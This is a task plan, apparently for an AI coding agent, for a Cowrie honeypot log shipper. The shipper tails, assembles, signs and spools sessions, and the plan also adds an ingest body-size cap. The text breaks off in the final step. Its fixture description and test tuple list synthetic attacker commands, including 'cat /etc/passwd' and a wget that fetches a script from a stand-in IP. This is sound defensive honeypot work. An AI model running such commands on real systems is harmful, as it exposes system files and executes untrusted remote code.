---
id: task-02
milestone: m6-real-data-deploy
depends_on: [task-01]
status: planned
spec: PRD.md §6.1 (one request = one session; HMAC over the raw body; duplicates → 200, never re-triage), §1.2 (one alert = one Cowrie session), §3 (the honeypot can only POST to one ingest URL with an HMAC secret; ingest answers in <100 ms), §11 Phase 1 ("shipper as a systemd unit that tails the Cowrie JSON log, assembles sessions, signs and POSTs on session close, and spools locally when the ingest URL is unreachable"), §10.4/§10.6 (attacker-controlled strings are data), §8 (error envelope); `docs/plans/m6-real-data-deploy.md` Global Constraints ("Bound the ingest request body" — the in-app `Content-Length` guard lands HERE; "The shipper never blocks Cowrie and never loses a closed session while the ingest URL is down"); `CONVENTIONS.md` §4 (error family; `api/errors.py` maps once), §7 (`.env.example` in the same commit), §8 (OpenAPI baseline + web codegen in the same commit); `.claude/rules/infra.md`, `.claude/rules/api.md`, `.claude/rules/tests.md`; `.claude/skills/cowrie-fixture/references/cowrie-events.md`
---

# task-02 — The shipper (`honeypot/shipper/`): rotation-aware tailer, session assembler with idle flush and payload cap, vendored signing, spool-first delivery with backoff and a dead-letter, systemd unit; plus the api's ingest body cap (411/413 before the signature check)

## Goal

A small, dependency-light Python program the honeypot host runs as an unprivileged systemd unit.
It follows `cowrie.json` across Cowrie's daily rotations, groups events by `session`, and the
moment a `cowrie.session.closed` event arrives it serializes that session as a `SessionAlert`
envelope, signs the exact bytes with the vendored HMAC algorithm and POSTs them to the one ingest
URL. Every payload is written to a disk spool BEFORE the first POST attempt and removed only after
a `200`/`202`, so an ingest outage of hours loses nothing and the sessions arrive in order when it
returns; a payload the api rejects for good (`401`, `413`, `422`) goes to a dead-letter directory
with one log line and never blocks the queue behind it. Sessions Cowrie never closes (a Cowrie
restart) are flushed after an idle timeout. The shipper never reads `honeypot/data/lib` (attacker
artifacts), never logs an attacker-controlled string, and holds exactly one secret
(`INGEST_HMAC_SECRET`, from a root-owned env file systemd hands it). Its tests replay a recorded
Cowrie log (`fixtures/cowrie/cowrie.json`) through the real code with an `httpx.MockTransport` at
the seam and prove the payloads validate as `SessionAlert` and fingerprint identically on the api
side. On the api side, the same task bounds the ingest body: a request whose declared
`Content-Length` exceeds `INGEST_MAX_BODY_BYTES` is answered `413` (and one without a
`Content-Length` `411`) BEFORE the signature check ever reads the body, so an unauthenticated
client can no longer make the api buffer an unbounded body.

## Context (read ONLY these)

- `PRD.md` §1.2, §3, §6.1, §8, §10.4, §10.6, §11 (the shipper paragraph).
- `docs/plans/m6-real-data-deploy.md` — Global Constraints (body cap; spool; no secret in the
  repo; the honeypot host holds only `INGEST_HMAC_SECRET`).
- `docs/plans/m6-real-data-deploy/task-01-cowrie-host.md` — the log path the shipper tails
  (`/opt/sentinelbrief-honeypot/data/log/cowrie.json`, host-side bind of the container's
  `var/log/cowrie`), the `shipper` system user the runbook creates, the Cowrie rotation shape
  (`cowrie.json` → `cowrie.json.YYYY-MM-DD` daily, new `cowrie.json` created).
- `.claude/skills/cowrie-fixture/references/cowrie-events.md` — the event shape (every event
  carries `eventid, timestamp, session, src_ip, sensor`; `cowrie.session.closed` carries
  `duration_ms`).
- Code you build on (read, do not modify unless listed under Files): `core/signing.py` (the
  algorithm the shipper vendors — `sign_body` is 3 lines: `hmac.new(secret.encode(), body,
  hashlib.sha256).hexdigest()` with the `"sha256="` prefix; header name `X-Signature`),
  `core/schemas/alert.py` (`SessionAlert`: `source="cowrie"`, `session_id`, `src_ip`, `sensor`,
  `events` sorted by timestamp with `events[0].eventid == "cowrie.session.connect"`; `extra="allow"`
  so an extra envelope key lands in `alerts.raw`), `api/routes/alerts.py::SignedRoute` (the
  before-everything hook the body cap joins), `api/deps.py::require_signature`,
  `api/errors.py::STATUS_BY_ERROR`, `core/errors.py`, `core/config.py`, `.env.example`,
  `tests/test_ingest.py` (the DB-less `create_app(settings=…)` + `ASGITransport` shape),
  `tests/helpers.py` (`signed_headers`, `fixture_body`), `scripts/fetch_geoip.py` +
  `tests/test_fetch_geoip.py` (the `transport=` seam pattern for an `httpx` CLI).
- Python on the honeypot host: AL2023's `python3.12` package (task-01 user-data installs it); the
  shipper's own `pyproject.toml` declares `requires-python = ">=3.12"` and its only dependency,
  `httpx`. It is installed into `/opt/sentinelbrief-shipper/.venv` with `pip` (hatchling builds
  the wheel on the box; no repo checkout, no `uv`). In THIS repo it is imported by the test suite
  via `[tool.pytest.ini_options] pythonpath = ["honeypot/shipper"]` and type-checked via
  `[tool.mypy] files += ["honeypot/shipper/sentinelbrief_shipper"]` (mypy resolves the package
  root at `honeypot/shipper/` because neither `honeypot/` nor `honeypot/shipper/` has an
  `__init__.py`); `uv.lock` does not change — `httpx` is already a runtime dependency here.

## Files

- Create (shipper): `honeypot/shipper/pyproject.toml`, `honeypot/shipper/README.md` (install +
  env file + unit; the "what it never does" list), `honeypot/shipper/sentinelbrief-shipper.service`,
  `honeypot/shipper/sentinelbrief_shipper/__init__.py` (`__version__ = "0.1.0"`),
  `honeypot/shipper/sentinelbrief_shipper/signing.py`, `…/config.py`, `…/tail.py`,
  `…/assemble.py`, `…/spool.py`, `…/post.py`, `…/main.py`, `…/__main__.py`
- Create (api body cap): nothing new — modify `core/config.py`, `core/errors.py`,
  `api/errors.py`, `api/deps.py`, `api/routes/alerts.py`, `.env.example`, `api/openapi.json`,
  `web/src/types/generated/schema.d.ts` (regenerated), `CONVENTIONS.md` §4 (the error roster gains
  `LengthRequiredError`, `PayloadTooLargeError`), `.claude/rules/api.md` (one line: the body cap
  runs before the signature), `PRD.md` §6.1 step 1 (one sentence + changelog v1.5 entry),
  `pyproject.toml` (`pythonpath`, mypy `files`), `docs/deployment.md` "Honeypot host" (the spool
  and dead-letter paths; the env file path)
- Create (test-author): `fixtures/cowrie/cowrie.json` (the replay log, JSON Lines),
  `fixtures/cowrie/README.md` (amend task-01's paragraph: what the replay contains, that every
  string in it is synthetic), `tests/test_shipper_config.py`, `tests/test_shipper_tail.py`,
  `tests/test_shipper_assemble.py`, `tests/test_shipper_spool.py`, `tests/test_shipper_post.py`,
  `tests/test_shipper_main.py`, `tests/test_shipper_isolation.py`, `tests/test_ingest_body_cap.py`;
  extend `tests/test_config.py` (one defaults test)

## Interfaces

- **Consumes:** task-01's log path and `shipper` user; `core/signing.py`'s algorithm (vendored,
  never imported); `SessionAlert`'s validation rules (the shipper must only ever emit payloads
  that pass them); `SignedRoute`'s `custom_handler` ordering (guard → signature → FastAPI).
- **Produces (task-05's walkthrough and task-06's soak rely on — produce exactly):**

  ```toml
  # honeypot/shipper/pyproject.toml
  [project]
  name = "sentinelbrief-shipper"
  version = "0.1.0"
  description = "Tails Cowrie's JSON log and POSTs one HMAC-signed alert per closed session to SentinelBrief's ingest URL."
  requires-python = ">=3.12"
  dependencies = ["httpx>=0.27,<1"]
  [project.scripts]
  sentinelbrief-shipper = "sentinelbrief_shipper.main:main"
  [build-system]
  requires = ["hatchling"]
  build-backend = "hatchling.build"
  [tool.hatch.build.targets.wheel]
  packages = ["sentinelbrief_shipper"]
  ```

  ```python
  # sentinelbrief_shipper/signing.py — vendored copy of core/signing.py::sign_body (the shipper never imports core)
  SIGNATURE_HEADER = "X-Signature"
  def sign_body(secret: str, body: bytes) -> str          # "sha256=" + hmac.new(secret.encode(), body, hashlib.sha256).hexdigest()

  # sentinelbrief_shipper/config.py
  @dataclass(frozen=True)
  class ShipperConfig:
      ingest_url: str                    # SHIPPER_INGEST_URL   (required; the full URL, e.g. https://api.sentinelbrief.<domain>/api/v1/alerts)
      hmac_secret: str                   # INGEST_HMAC_SECRET   (required; never logged, never in repr — the dataclass sets repr=False on this field)
      log_path: Path                     # SHIPPER_LOG_PATH     default /opt/sentinelbrief-honeypot/data/log/cowrie.json
      state_dir: Path                    # SHIPPER_STATE_DIR    default /var/lib/sentinelbrief-shipper  (tail.json, spool/, spool/dead/)
      idle_flush_s: float = 900.0        # SHIPPER_IDLE_FLUSH_S — a session with no event for this long is shipped without a closed event
      max_events: int = 2000             # SHIPPER_MAX_EVENTS   — per-session event cap (first max_events-1 kept + the closing event)
      max_payload_bytes: int = 1_500_000 # SHIPPER_MAX_PAYLOAD_BYTES — serialized cap; MUST stay below the api's INGEST_MAX_BODY_BYTES (2_000_000) and Caddy's 2MB
      post_timeout_s: float = 10.0       # SHIPPER_POST_TIMEOUT_S
      backoff_base_s: float = 2.0        # SHIPPER_BACKOFF_BASE_S — doubles per consecutive retryable failure
      backoff_max_s: float = 300.0       # SHIPPER_BACKOFF_MAX_S
      spool_max_files: int = 10_000      # SHIPPER_SPOOL_MAX_FILES — disk protection: when full, the OLDEST spooled payload is dropped with one WARNING
      poll_interval_s: float = 1.0       # SHIPPER_POLL_INTERVAL_S — sleep when the log has no new complete line
      @classmethod
      def from_env(cls, env: Mapping[str, str]) -> ShipperConfig
          # ValueError("SHIPPER_INGEST_URL is required") / ("INGEST_HMAC_SECRET is required") / (f"{NAME} must be a positive number") — names only, never a value

  # sentinelbrief_shipper/tail.py — rotation-aware line follower with persisted position
  @dataclass
  class TailState: inode: int; offset: int          # JSON in <state_dir>/tail.json, rewritten (tmp + os.replace) after every batch that returned lines
  class LogTailer:
      def __init__(self, path: Path, state_path: Path) -> None
      def read_new_lines(self) -> list[str]
          # 1. If no file is open: open `path` (missing → return [] silently; Cowrie may not have written yet); if the saved state's inode == this inode, seek to its offset (offset > size → truncated → seek 0).
          # 2. Read to EOF; split on "\n"; a trailing partial line stays buffered until its newline arrives; return complete lines (stripped of "\n").
          # 3. Rotation: if os.stat(path).st_ino != the open file's inode, the open file is the rotated one — return its remaining lines this call, close it, and open the new `path` on the NEXT call (offset 0). Cowrie renames cowrie.json → cowrie.json.<date> and creates a new cowrie.json.
          # 4. Persist TailState(inode, offset) after any call that returned ≥1 line.

  # sentinelbrief_shipper/assemble.py
  CLOSED_EVENT = "cowrie.session.closed"; CONNECT_EVENT = "cowrie.session.connect"
  @dataclass
  class OpenSession: session_id: str; src_ip: str; sensor: str; events: list[dict[str, Any]]; last_seen: float; has_connect: bool
  @dataclass(frozen=True)
  class AssemblerStats: parse_errors: int; dropped_no_connect: int; truncated_sessions: int   # counters only — never strings
  class SessionAssembler:
      def __init__(self, *, idle_flush_s: float, max_events: int, max_payload_bytes: int, clock: Callable[[], float] = time.monotonic) -> None
      def feed(self, line: str) -> list[bytes]
          # json.loads; not a dict / missing any of eventid|session|src_ip|sensor|timestamp → parse_errors += 1, logger.warning("shipper: unparseable log line skipped (count=%d)") — NEVER the line; returns [].
          # First event for a session opens it (src_ip/sensor from that event; has_connect = eventid == CONNECT_EVENT). Later events append; last_seen = clock().
          # eventid == CLOSED_EVENT → if has_connect: return [build_payload(session)] and forget it; else dropped_no_connect += 1, logger.warning("shipper: session dropped, no connect event session_id=%s"), forget, return [].
      def flush_idle(self) -> list[bytes]        # every open session with clock() - last_seen >= idle_flush_s and has_connect → payload (no closed event; the api derives duration_ms=None); no-connect idle sessions are dropped with the same WARNING; all flushed sessions are forgotten
      def build_payload(self, session: OpenSession) -> bytes
          # envelope = {"source": "cowrie", "session_id", "src_ip", "sensor", "events": [...], "shipper": {"version": __version__, "truncated_events": n}}   ("shipper" key only when n > 0)
          # events kept in arrival order (the api sorts by timestamp; Cowrie writes in order).
          # cap 1: if len(events) > max_events → keep events[:max_events-1] + [events[-1]]  (events[-1] is the closing event on the close path) → n = dropped.
          # cap 2: while len(json) > max_payload_bytes and len(kept) > 2: kept = kept[: max(2, len(kept)//2) - 1] + [kept[-1]]; n += dropped.  (events[0] — the connect — is always kept, so the payload always validates.)
          # bytes = json.dumps(envelope, separators=(",", ":"), sort_keys=True, ensure_ascii=False).encode("utf-8")   — the signature is computed over exactly these bytes.
      @property
      def stats(self) -> AssemblerStats
      @property
      def open_count(self) -> int

  # sentinelbrief_shipper/spool.py — FIFO on disk, written before the first POST
  class Spool:
      def __init__(self, directory: Path, *, max_files: int) -> None      # creates <directory>/ and <directory>/dead/
      def put(self, payload: bytes) -> Path        # name f"{time.time_ns():020d}-{sha256(payload).hexdigest()[:8]}.json"; write to name+".tmp" then os.replace; when len(pending()) >= max_files first: unlink the oldest and logger.warning("shipper: spool full, oldest payload dropped (max_files=%d)")
      def pending(self) -> list[Path]              # *.json in <directory> (not dead/), sorted by name → FIFO
      def remove(self, path: Path) -> None
      def dead(self, path: Path, *, status: int) -> None    # os.replace into dead/<same name>; logger.warning("shipper: payload dead-lettered status=%d file=%s", status, path.name)

  # sentinelbrief_shipper/post.py
  @dataclass(frozen=True)
  class PostResult: status: int | None; retry: bool
  class Poster:
      def __init__(self, url: str, secret: str, *, timeout_s: float, transport: httpx.BaseTransport | None = None) -> None   # sync httpx.Client; headers on every call: SIGNATURE_HEADER, "content-type: application/json", "user-agent: sentinelbrief-shipper/<__version__>"
      def post(self, payload: bytes) -> PostResult
          # 200|202 → (status, False); 408|425|429|5xx → (status, True); any other 4xx → (status, False); httpx.HTTPError (connect/read/timeout) → (None, True). Never raises.
      def close(self) -> None

  # sentinelbrief_shipper/main.py
  class Backoff:
      def __init__(self, *, base_s: float, max_s: float, sleep: Callable[[float], None] = time.sleep) -> None
      def wait(self) -> float      # sleeps min(base_s * 2**n, max_s), n = consecutive calls since reset(); returns the delay it slept
      def reset(self) -> None
  def drain(spool: Spool, poster: Poster, backoff: Backoff) -> int
      # for path in spool.pending(): result = poster.post(path.read_bytes()); retry → backoff.wait(); return delivered (stop draining — the next iteration retries the SAME file first); not retry and 2xx → spool.remove; backoff.reset(); not retry and 4xx → spool.dead(path, status=status). Returns the count delivered.
  def run_once(tailer: LogTailer, assembler: SessionAssembler, spool: Spool, poster: Poster, backoff: Backoff) -> int
      # lines = tailer.read_new_lines(); for line: for payload in assembler.feed(line): spool.put(payload); for payload in assembler.flush_idle(): spool.put(payload); return drain(spool, poster, backoff)
  def main(argv: Sequence[str] | None = None, *, env: Mapping[str, str] | None = None, transport: httpx.BaseTransport | None = None, max_iterations: int | None = None, sleep: Callable[[float], None] = time.sleep) -> int
      # argparse: --once (one run_once, exit 0), --state-dir/--log-path overrides (else config); builds the five collaborators from ShipperConfig.from_env(env or os.environ); loop: run_once; if no line was read this iteration → sleep(poll_interval_s); stops after max_iterations (tests) or SIGTERM/SIGINT (installs handlers that set a flag; the current iteration finishes — a payload is never half-written because the spool writes tmp+replace). Exit 0 on clean stop; 1 on ValueError from config (one stderr line naming the variable) or an unreadable state dir.
      # Logging: logging.basicConfig(level=INFO, format="%(levelname)s %(name)s %(message)s") to stderr — journald keeps it. One INFO line per delivered payload: "shipper: delivered session_id=%s status=%d bytes=%d". NEVER a username, password, command, banner, URL or IP from the log in any record (session_id is a Cowrie hex id and is the only per-session field logged).
  # sentinelbrief_shipper/__main__.py: raise SystemExit(main())
  ```

  ```ini
  # honeypot/shipper/sentinelbrief-shipper.service   (installed at /etc/systemd/system/)
  [Unit]
  Description=SentinelBrief Cowrie log shipper
  After=docker.service network-online.target
  Wants=network-online.target
  [Service]
  Type=simple
  User=shipper
  Group=shipper
  EnvironmentFile=/etc/sentinelbrief-shipper.env        # root:root 0600 — SHIPPER_INGEST_URL=… and INGEST_HMAC_SECRET=… only; systemd reads it as root and hands the values to the unprivileged process
  ExecStart=/opt/sentinelbrief-shipper/.venv/bin/sentinelbrief-shipper
  StateDirectory=sentinelbrief-shipper                   # systemd creates /var/lib/sentinelbrief-shipper owned by `shipper` — matches SHIPPER_STATE_DIR's default
  Restart=always
  RestartSec=5
  NoNewPrivileges=true
  ProtectSystem=strict
  ProtectHome=true
  ReadOnlyPaths=/opt/sentinelbrief-honeypot/data/log
  PrivateTmp=true
  [Install]
  WantedBy=multi-user.target
  ```

  `honeypot/shipper/README.md` (install on the honeypot host, owner-run via SSM; task-05 sequences
  it): `dnf install -y python3.12` (done by user-data) → copy `honeypot/shipper/` to
  `/opt/sentinelbrief-shipper/src` → `python3.12 -m venv /opt/sentinelbrief-shipper/.venv &&
  /opt/sentinelbrief-shipper/.venv/bin/pip install /opt/sentinelbrief-shipper/src` → write
  `/etc/sentinelbrief-shipper.env` (`install -m 600 -o root -g root`; two lines; the secret is
  pasted from the owner's terminal in the SSM session — the honeypot's instance role can NOT read
  SSM parameters, by design) → `cp sentinelbrief-shipper.service /etc/systemd/system/ && systemctl
  daemon-reload && systemctl enable --now sentinelbrief-shipper` → `journalctl -u
  sentinelbrief-shipper -f` shows `shipper: delivered session_id=… status=202` after the first
  attacker session closes. "What it never does": reads `data/lib`, logs a payload field, retries
  a `401`/`413`/`422` (dead-lettered under `/var/lib/sentinelbrief-shipper/spool/dead/` for the
  owner to inspect), runs as root, holds any secret but `INGEST_HMAC_SECRET`.

  **api side — the ingest body cap (Global Constraint; M2 final review I1):**

  ```python
  # core/config.py
  ingest_max_body_bytes: Annotated[int, Field(ge=1)] = 2_000_000    # INGEST_MAX_BODY_BYTES — the prod Caddyfile's `request_body { max_size 2MB }` (task-03) is the outer bound; this is the in-app one
  # core/errors.py
  class LengthRequiredError(SentinelBriefError): code = "length_required"      # 411: no usable Content-Length on a signed-route request
  class PayloadTooLargeError(SentinelBriefError): code = "payload_too_large"   # 413: declared Content-Length above the cap
  # api/errors.py: STATUS_BY_ERROR gains LengthRequiredError: 411, PayloadTooLargeError: 413
  # api/deps.py
  def require_content_length(request: Request, settings: Settings) -> None
      # header = request.headers.get("content-length"); None or not str.isdigit() → LengthRequiredError("Content-Length required"); int(header) > settings.ingest_max_body_bytes → PayloadTooLargeError(f"body exceeds {settings.ingest_max_body_bytes} bytes"). Reads NO body bytes. The message names the limit, never the declared size.
  # api/routes/alerts.py::SignedRoute.custom_handler — the FIRST call, before `await require_signature(...)`:
  #     require_content_length(request, get_settings(request))
  # ingest_alert's `responses` gains 411 and 413 (ErrorEnvelope) → scripts/export_openapi.py regenerates api/openapi.json; `pnpm -C web codegen` regenerates schema.d.ts — same commit.
  ```

  Why a declared-length check and not a streamed one: Starlette caches `request.body()`, so a
  streaming cap here would have to re-inject the bytes for FastAPI's parser; the declared length
  is enough because Caddy (task-03) enforces the real byte count on the wire and a chunked request
  (no `Content-Length`) is refused outright with `411`. Both are pinned below.

## Interfaces → test table

Every shipper test drives the real classes; the only fakes are `httpx.MockTransport` (the ingest
URL), an injected `clock`, and an injected `sleep`. `fixtures/cowrie/cowrie.json` (JSON Lines, ~45
lines, written by the test-author) holds exactly: session **A** (`a1b2c3d4e5f6`, `hp-use-01`,
`198.51.100.20`: connect, client.version, login.failed ×2, login.success, command.input ×3
(`uname -a`, `cat /etc/passwd`, `wget http://203.0.113.9/x.sh`), session.file_download,
session.closed with `duration_ms`), session **B** (`b2c3d4e5f6a7`, `198.51.100.21`: connect,
client.version, login.failed ×3, session.closed) with its events INTERLEAVED with A's in timestamp
order, session **C** (`c3d4e5f6a7b8`, `198.51.100.22`: connect, client.version, login.failed — never
closed), session **D** (`d4e5f6a7b8c9`: ONLY a `cowrie.command.input` and a `session.closed`, no
connect — the "shipper started mid-session" case), one malformed line (`{"eventid": "cowrie.` —
truncated JSON), and one event with an eventid outside `cowrie-events.md`'s summarized set
(`cowrie.client.size`, with `width`/`height`) inside session A. Every IP is from the
documentation ranges; every string is synthetic. `_ATTACKER_STRINGS = ("uname -a", "cat
/etc/passwd", "203.0.113.9/x.sh", "libssh2", "[root/123456]")` is the tuple the negative log
pins scan for (each string is specific enough never to occur in a legitimate shipper log line).

| Interfaces line | test file::test name | failure branch covered / mutant killed |
|---|---|---|
| `ShipperConfig.from_env` | `test_shipper_config.py::test_from_env_requires_url_and_secret` | each missing var → `ValueError` whose message names the var and contains no value (the test sets a canary secret and asserts it is absent from `str(exc)`); `::test_from_env_defaults_and_overrides` — every default literal above (R17 literal + comment) and one override per numeric field; `::test_secret_absent_from_repr` — `repr(cfg)` lacks the canary |
| `LogTailer` complete lines only | `test_shipper_tail.py::test_returns_complete_lines_and_buffers_partial` | write `a\nb\npartial` → `["a","b"]`; append `-tail\n` → `["partial-tail"]` |
| `LogTailer` state persisted | `::test_position_survives_restart` | new `LogTailer` on the same state file resumes at the offset (no re-delivery of `a`,`b`) — mutant: drop the persist → re-read |
| `LogTailer` rotation | `::test_rotation_drains_old_file_then_follows_new` | write 2 lines, read; append 1 more, `os.rename` to `.2026-09-11`, create a new file with 1 line → next call returns the appended old line; the call after returns the new file's line; state inode == new inode |
| `LogTailer` truncation + missing | `::test_truncation_restarts_at_zero`, `::test_missing_file_returns_empty` | offset > size → reads from 0; `path` absent → `[]`, no raise |
| assembler close path | `test_shipper_assemble.py::test_replay_yields_payloads_for_closed_sessions_in_close_order` | feeding the replay yields exactly A then B (B closes after A in the fixture? — the test-author orders the fixture so **B closes first**, then A; the assertion lists `["b2c3d4e5f6a7", "a1b2c3d4e5f6"]`); C and D never appear; each payload `SessionAlert.model_validate`s and `.fingerprint()` equals `sha256("cowrie|<id>|<connect ts as UTC isoformat>")` computed by the test from the fixture's connect timestamp |
| assembler parse errors + no-connect | `::test_malformed_line_and_no_connect_session_are_counted_not_shipped` | `stats.parse_errors == 1`, `stats.dropped_no_connect == 1` (D at its close); caplog: the malformed line's text is absent, the WARNING count line present |
| idle flush | `::test_idle_flush_ships_unclosed_session_after_timeout` | fake clock; C is returned by `flush_idle()` only once clock advances ≥ `idle_flush_s`; its payload has no closed event and validates; `open_count == 0` after |
| cap 1 | `::test_event_cap_keeps_connect_and_closing_event` | `max_events=5`, a synthetic 12-event session → payload has 5 events, `events[0]` connect, `events[-1]` closed, `shipper.truncated_events == 7` |
| cap 2 | `::test_byte_cap_halves_until_under_limit` | `max_payload_bytes=2_000` with 40 events of 200-char `input` → payload ≤ 2000 bytes, ≥ 2 events, connect first, closed last, `truncated_events` = 40 − kept |
| deterministic bytes | `::test_payload_bytes_are_deterministic_and_signable` | two `build_payload` calls on equal sessions are byte-equal; `sign_body(secret, bytes)` equals `core.signing.sign_body` (imported in the TEST only) |
| negative log pin (rule 1) | `::test_no_attacker_string_in_any_log_record` | after the full replay + idle flush at WARNING level, `all(s not in rec.getMessage() for s in _ATTACKER_STRINGS for rec in caplog.records)` |
| spool FIFO + atomic | `test_shipper_spool.py::test_put_pending_fifo_and_atomic_names` | three puts → `pending()` in put order; no `.tmp` left; `remove` drops one |
| spool full | `::test_spool_full_drops_oldest_with_warning` | `max_files=2`, third put → first gone, caplog has the WARNING with `max_files=2` |
| dead-letter | `::test_dead_moves_file_and_logs_status` | `dead(path, status=401)` → file under `dead/`, not in `pending()`, WARNING carries `status=401` and the file NAME only |
| poster mapping | `test_shipper_post.py::test_status_to_retry_mapping` | parametrized: 200→(200,F), 202→(202,F), 401→(401,F), 413→(413,F), 422→(422,F), 429→(429,T), 503→(503,T), `httpx.ConnectError`→(None,T) |
| poster headers | `::test_post_sends_signature_over_exact_bytes_and_user_agent` | MockTransport captures the request: `X-Signature == sign_body(secret, request.content)`, `content-type == application/json`, `user-agent` startswith `sentinelbrief-shipper/` |
| drain stops on retryable | `test_shipper_main.py::test_drain_stops_at_first_retryable_failure_and_keeps_order` | spool [p1,p2,p3]; transport: p1 202, p2 ConnectError → drain returns 1, `pending() == [p2,p3]`, backoff waited once; next drain with the transport healed delivers p2 then p3 (order pinned by capturing bodies) |
| dead-letter path | `::test_drain_dead_letters_4xx_and_continues` | p1 401, p2 202 → p1 in `dead/`, p2 delivered, `pending() == []` |
| outage never loses a session | `::test_outage_then_recovery_delivers_every_closed_session_in_order` | replay through `main(max_iterations=…)` with a transport that raises `ConnectError` for the first 4 calls then 202: captured bodies == the two closed sessions in close order; spool empty; `sleep` calls recorded (backoff 2,4,8,16 capped at `backoff_max_s`) — the PRD "never loses a closed session" clause |
| `--once` end-to-end | `::test_main_once_replays_fixture_and_exits_zero` | `main(["--once"], env={...}, transport=…)` → 0; two POSTs; each body validates as `SessionAlert` |
| config error exit | `::test_main_exit_1_names_missing_var_without_value` | `env` without the secret → 1; stderr names `INGEST_HMAC_SECRET`; a canary URL value is not echoed either |
| SIGTERM flag | `::test_sigterm_stops_after_current_iteration` | install handler via `main` with `max_iterations=None` and a transport whose first call sends `signal.raise_signal(SIGTERM)`… (the test-author may instead expose `_stop_requested` via a `stop_event: threading.Event` kwarg on `main` — decide, document in the report; the pin is: no partial spool file and exit 0) |
| isolation | `test_shipper_isolation.py::test_shipper_imports_nothing_from_the_repo` | walks `honeypot/shipper/sentinelbrief_shipper/*.py` with `ast`: no `import`/`from` of `core`, `api`, `worker`, `evals`, `tests`; only stdlib + `httpx` |
| vendored equality | `::test_vendored_sign_body_matches_core` | three inputs (empty body; 1 KiB; non-ASCII secret + body) → identical strings from both implementations |
| unit file + pyproject | `::test_unit_file_hardening_and_pyproject_shape` | unit text has `User=shipper`, `EnvironmentFile=/etc/sentinelbrief-shipper.env`, `NoNewPrivileges=true`, `ProtectSystem=strict`, `StateDirectory=sentinelbrief-shipper`, `Restart=always`; pyproject parses (`tomllib`), `dependencies == ["httpx>=0.27,<1"]`, `requires-python == ">=3.12"` |
| api cap: oversized before signature | `test_ingest_body_cap.py::test_oversized_declared_length_is_413_before_signature` | `Settings(ingest_max_body_bytes=4096)` (rule 7 — distinguishable from the default); unsigned POST with `Content-Length: 4097` (httpx sets it from a 4097-byte body) → `413 {"error":{"code":"payload_too_large",…}}`; a `FakeEnqueue` proves nothing was enqueued; the same body correctly signed → still `413` |
| api cap: at cap passes | `::test_body_at_cap_reaches_signature_check` | 4096-byte unsigned body → `401` (the guard passed it on); DB-less |
| api cap: chunked | `::test_missing_content_length_is_411` | body passed as an ASYNC generator (`async def body(): yield b"{}"` → `content=body()`) — under `ASGITransport` httpx then sends `transfer-encoding: chunked` and NO `content-length` (verified at briefing 2026-09-11; a sync `iter([...])` raises `RuntimeError: Attempted to send an sync request with an AsyncClient`) → `411 length_required` |
| api cap: non-numeric | `::test_require_content_length_rejects_non_numeric_header` | unit: `Request(scope)` with `content-length: abc` → `LengthRequiredError` |
| api cap: not global | `::test_unsigned_get_routes_need_no_content_length` | `GET /healthz` (DB-less → `503 degraded`, NOT `411`) — the guard lives on `SignedRoute` only |
| api cap: real ingest under cap | `::test_signed_post_under_cap_is_accepted` | DB fixtures; `alert4` fixture (< 4096 bytes) signed → `202` |
| default | `test_config.py::test_ingest_max_body_bytes_default` | `Settings().ingest_max_body_bytes == 2_000_000  # R17: the .env.example default, literal on purpose` |
| envelope + baseline | existing `tests/test_openapi_baseline.py`, `tests/test_env_example_roster.py`, `tests/test_error_status_mapping.py` (extend the mapping table with the two new classes) | drift in `api/openapi.json` / `.env.example` fails the suite |

## Steps (TDD)

Roles: the **test-author** writes Steps 1–2 (fixture + nine test files) and pins them; the
**implementer** does Steps 3–8.

- [ ] **Step 1 (RED — test-author):** `fixtures/cowrie/cowrie.json` + README paragraph; the eight
  shipper test files per the table (import `sentinelbrief_shipper` — it will fail with
  `ModuleNotFoundError` until Step 3; the test-author adds `pythonpath = ["honeypot/shipper"]` to
  `pyproject.toml` `[tool.pytest.ini_options]` as part of RED so the failure is on the missing
  package, not the path); `tests/test_ingest_body_cap.py`; the `test_config.py` default test.
- [ ] **Step 2 (RED — test-author):** `uv run pytest -q tests/test_shipper_*.py
  tests/test_ingest_body_cap.py tests/test_config.py` → Expected: shipper files error at
  collection (`ModuleNotFoundError: sentinelbrief_shipper`), body-cap tests fail (`401`/`202`
  instead of `413`/`411`; `Settings` has no `ingest_max_body_bytes` → `ValidationError` for the
  extra kwarg). Pin, commit `test(honeypot,api): shipper replay suite + ingest body cap RED (m6
  task-02)`.
- [ ] **Step 3 (GREEN — implementer): the shipper package** — `pyproject.toml`, the eight modules
  per Interfaces; `[tool.mypy] files` gains `"honeypot/shipper/sentinelbrief_shipper"`; `uv run
  mypy --no-incremental` clean (strict applies to the shipper too).
- [ ] **Step 4 (GREEN — implementer): unit + README + `__main__`.** Locally: `python3 -m venv
  /tmp/claude-…/scratchpad/shipper-venv && …/pip install honeypot/shipper` proves the wheel builds
  and the console script exists (paste `sentinelbrief-shipper --help`'s first line).
- [ ] **Step 5 (GREEN — implementer): the api cap** — `Settings.ingest_max_body_bytes`, the two
  errors, the mapping, `require_content_length`, the `SignedRoute` call order, `responses`;
  `uv run python scripts/export_openapi.py` → `api/openapi.json`; `pnpm -C web codegen`;
  `.env.example` line under "Ingest & admin auth": `INGEST_MAX_BODY_BYTES=2000000` with the
  two-sentence comment (outer bound = Caddy; the shipper's `SHIPPER_MAX_PAYLOAD_BYTES` must stay
  below it).
- [ ] **Step 6 (implementer): docs** — `CONVENTIONS.md` §4 roster; `.claude/rules/api.md` line;
  `PRD.md` §6.1 step 1 gains "A request whose declared `Content-Length` exceeds
  `INGEST_MAX_BODY_BYTES` is refused `413` (no `Content-Length` → `411`) before the signature is
  read" + changelog **v1.5** entry; `docs/deployment.md` "Honeypot host" bullets: the env file
  path, the state dir, spool + dead-letter paths.
- [ ] **Step 7 (implementer): replay it for real.** Start the dev stack (with the M5 scratch
  override that drops the Redis host port), then in the scratchpad: `SHIPPER_INGEST_URL=http://127.0.0.1:8000/api/v1/alerts
  INGEST_HMAC_SECRET=$(grep '^INGEST_HMAC_SECRET=' .env | cut -d= -f2-) SHIPPER_LOG_PATH=$PWD/fixtures/cowrie/cowrie.json
  SHIPPER_STATE_DIR=<scratch>/shipper-state uv run python -m sentinelbrief_shipper --once` (with
  `PYTHONPATH=honeypot/shipper`) → two `delivered … status=202` lines; a second `--once` → zero
  POSTs (tail state); paste the journal-style lines (never the secret). `docker compose … down`.
- [ ] **Step 8 (implementer): full gates (cold) → commit** `feat(honeypot,api): cowrie log shipper
  (tail/assemble/spool/post, systemd unit) + ingest body cap 411/413 (m6 task-02)`; path-scoped
  `git add honeypot/shipper core api pyproject.toml .env.example api/openapi.json
